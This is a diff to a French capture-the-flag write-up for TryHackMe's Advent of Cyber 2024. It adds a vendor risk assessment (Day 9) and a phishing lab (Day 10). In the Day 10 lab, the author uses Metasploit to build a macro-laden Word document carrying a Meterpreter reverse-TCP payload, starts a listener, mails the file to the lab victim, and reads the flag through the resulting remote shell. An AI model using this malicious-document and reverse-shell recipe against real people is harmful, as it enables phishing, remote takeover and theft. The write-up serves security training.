@@ -22,6 +22,8 @@ Lien vers l'épreuve : <https://tryhackme.com/r/room/adventofcyber2024>
 * [Jour 6 : Si je ne peux pas trouver un gentil malware à utiliser, je ne le ferai pas](#jour-6--si-je-ne-peux-pas-trouver-un-gentil-malware-à-utiliser-je-ne-le-ferai-pas)
 * [Jour 7 : *Oh no. I'M SPEAKING IN CLOUDTRAIL!*](#jour-7--oh-no-im-speaking-in-cloudtrail)
 * [Jour 8 : Shellcodes du monde, rassemblement](#jour-8--shellcodes-du-monde-rassemblement)
+* [Jour 9 : 9 heure, rend le GRC amusant, ne le dis à personne](#jour-9--9-heure-rend-le-grc-amusant-ne-le-dis-à-personne)
+* [Jour 10 : Il a un cerveau rempli de macro, et il a des shells dans son âme](#jour-10--il-a-un-cerveau-rempli-de-macro-et-il-a-des-shells-dans-son-âme)
 
 ## Jour 1 : Peut-être que la musique de SOC-mas, pensait-il, ne vient pas d'un magasin ?
 
@@ -777,4 +779,167 @@ Mode                LastWriteTime         Length Name
 PS C:\Users\glitch\Desktop> Get-Content flag.txt
 Get-Content flag.txt
 AOC{[...expurgé...]}
+```
+
+## Jour 9 : 9 heure, rend le GRC amusant, ne le dis à personne
+
+![GRC](https://img.shields.io/badge/GRC-314267?logo=tryhackme)
+
+![Jour 9](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/6093e17fa004d20049b6933e-1731940347460.png)
+
+Le défi du jour nous demande d'évaluer 3 fournisseurs dans le cadre d'une activité GRC (*Governance, Risk and Compliance*).
+
+**Fournisseur 1**
+
+Nous devons chiffrer toutes nos données via un algorithme AES, néanmoins le fournisseur nous indique qu'il ne chiffre ni les données en transit, ni les données stockée. Cela représente un risque de vol de données **élevé** et **très certain** d'arriver.
+
+Le fournisseur met en place un système *need-to-know* pour accéder aux données. C'est-à-dire que les personnes n'ont accès qu'aux données qui leur sont utiles. Bien que la méthode soit sécurisée, cela implique néanmoins la possibilité **critique** mais **rare** qu'un utilisateur empêche l'accès à ses données en cas de besoin de contrôle.
+
+Lorsque le contrat est arrivé à son terme, le fournisseur conserve les données "plus d'un mois". L'absence de durée claire peut laisser craindre des fuites de données qui ne seraient plus correctement protégées, ce qui serait **critique** et **très probable**.
+
+**Fournisseur 2**
+
+De la même façon que le **fournisseur 1**, ce nouveau fournisseur ne chiffre pas les données, ce qui représente un risque de vol de données **élevé** et **très probable**.
+
+Les données ne sont accessibles que par les équipes dédiées, et les administrateurs. Un risque de vol de compte ou d'abus de pouvoir pourrait se présenter, ce qui est **critique** et **certain**
+
+Les données sont conservées entre 2 semaines et 1 mois après la fin du contrat. Durant cette période, des données pourraient être volées, ce qui aurait un impact **critique** et un risque **certain**.
+
+**Fournisseur 3**
+
+Le dernier fournisseur nous propose un chiffrement AES-256 sur les transits et le stockage. Cela peut engendrer une surconsommation des ressources ou une éventuelle perte de clé. Bien que l'impact serait **élevé**, ce risque reste **rare**
+
+Seule l'équipe dédiée a accès aux ressources. Il reste un risque résiduel de compromission de compte dans l'équipe, il s'agit d'un risque **critique** de l'ordre du **possible**.
+
+Comme le premier fournisseur, celui-ci conserve les données plus d'un mois. Le risque **critique** de vol de données devient **très probable**.
+
+**Conclusion**
+
+Entre les 3 fournisseurs, seul le dernier propose le chiffrement des données, et réduit ainsi son score de risque devenant ainsi le meilleur candidat
+
+## Jour 10 : Il a un cerveau rempli de macro, et il a des shells dans son âme
+
+![Phishing](https://img.shields.io/badge/Phishing-4d354a?logo=tryhackme)
+
+![Jour 10](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/5f04259cf9bf5b57aed2c476-1731376026704.svg)
+
+Le dixième défi du Calendrier de l'Avent 2024 nous apprend la création d'un fichier `.docm` (document Word avec macro) dans une simulation de phishing.
+
+La *payload* comportera un `meterpreter` pour Windows et sera créé via le *framework* `msfconsole`.
+
+```txt
+msf6 > setg payload windows/meterpreter/reverse_tcp
+payload => windows/meterpreter/reverse_tcp
+
+use exploit/multi/fileformat/office_word_macro
+[*] Using configured payload windows/meterpreter/reverse_tcp
+
+msf6 exploit(multi/fileformat/office_word_macro) > setg lhost 10.10.189.230
+lhost => 10.10.189.230
+
+msf6 exploit(multi/fileformat/office_word_macro) > setg lport 9000
+lport => 9000
+
+set filename you_w0n.docm
+filename => you_w0n.docm
+
+msf6 exploit(multi/fileformat/office_word_macro) > show options 
+
+Module options (exploit/multi/fileformat/office_word_macro):
+
+   Name            Current Setting                     Required  Description
+   ----            ---------------                     --------  -----------
+   CUSTOMTEMPLATE  /opt/metasploit-framework/embedded  yes       A docx file that will be used as a template to build the exp
+                   /framework/data/exploits/office_wo            loit
+                   rd_macro/template.docx
+   FILENAME        you_w0n.docm                        yes       The Office document macro file (docm)
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     ens5             yes       The listen address (an interface may be specified)
+   LPORT     9000             yes       The listen port
+
+   **DisablePayloadHandler: True   (no handler will be created!)**
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Microsoft Office Word on Windows
+
+msf6 exploit(multi/fileformat/office_word_macro) > run
+
+[*] Using template: /opt/metasploit-framework/embedded/framework/data/exploits/office_word_macro/template.docx
+[*] Injecting payload in document comments
+[*] Injecting macro and other required files in document
+[*] Finalizing docm: you_w0n.docm
+[+] you_w0n.docm stored at /root/.msf4/local/you_w0n.docm
+```
+
+> l'option `setg` (*set global*) permet de saisir les paramètres qui seront conservés, ce qui nous fera gagner du temps lors de la mise en place du *handler* à l'étape suivante.
+
+```txt
+msf6 exploit(multi/fileformat/office_word_macro) > use multi/handler
+[*] Using configured payload windows/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > show options
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     10.10.189.230    yes       The listen address (an interface may be specified)
+   LPORT     9000             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+msf6 exploit(multi/handler) > exploit
+
+[*] Started reverse TCP handler on 10.10.189.230:9000
+```
+
+> Le *handler* est prérempli grâce à l'utilisation de `setg` à l'étape précédente
+
+Nous allons maintenant envoyer le fichier malicieux à notre victime, et attendre qu'il soit utilisé.
+
+{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-10_mail.png" caption="Un mail de phishing plus vrai que nature... Ou presque" %}
+
+Après quelques minutes, nous obtenons finalement une communication entrante :
+
+```txt
+msf6 exploit(multi/handler) > exploit
+
+[*] Started reverse TCP handler on 10.10.189.230:9000 
+[*] Sending stage (177734 bytes) to 10.10.131.147
+[*] Meterpreter session 1 opened (10.10.189.230:9000 -> 10.10.131.147:49957) at 2024-12-16 21:29:57 +0000
+
+meterpreter > 
+```
+
+Nous pouvons ouvrir le document qui nous intéresse via le `meterpreter` en place :
+
+```txt
+ls C:/Users/Administrator/Desktop
+Listing: C:/Users/Administrator/Desktop
+=======================================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+100666/rw-rw-rw-  527   fil   2016-06-21 16:36:17 +0100  EC2 Feedback.website
+100666/rw-rw-rw-  554   fil   2016-06-21 16:36:23 +0100  EC2 Microsoft Windows Guide.website
+100666/rw-rw-rw-  282   fil   2021-03-17 15:13:27 +0000  desktop.ini
+100666/rw-rw-rw-  23    fil   2024-11-12 03:42:45 +0000  flag.txt
+
+meterpreter > cat C:/Users/Administrator/Desktop/flag.txt
+THM{[...expurgé...]}
 ```
